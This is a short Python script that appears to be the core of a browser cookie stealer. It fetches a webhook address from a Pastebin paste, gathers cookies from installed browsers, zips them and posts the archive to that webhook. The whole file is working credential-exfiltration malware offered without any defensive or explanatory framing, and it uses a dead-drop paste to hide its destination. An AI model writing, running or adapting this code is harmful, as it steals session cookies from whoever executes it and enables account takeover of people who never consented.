from utils.CookieUtils import CookieUtils
from utils import Environment
from utils import BrowserUtils
import requests
import io
import zipfile
import time

def main():
    paste_id = Environment.PASTEBIN_URL.split('/')[3]
    webhook_url = requests.get(f"https://pastebin.com/raw/{paste_id}").text
    
    cookie_utils = CookieUtils()
    cookies = cookie_utils.get_cookies()
    cookie_dict = {}
    for i in range(len(cookies)):
        cookie = cookies[i]
        cookie_dict[f"{BrowserUtils.id_map[cookie.browser_id]}.txt"] = cookie_utils.cookiejar_to_str(cookiejar=cookie.cookie_jar)

    zip_file_buffer = cookie_utils.zip_cookie_dict(cookie_dict)
    requests.post(webhook_url, files={"file": (f'cookies-{int(time.time())}.zip', zip_file_buffer)})

if __name__ == "__main__":
    main()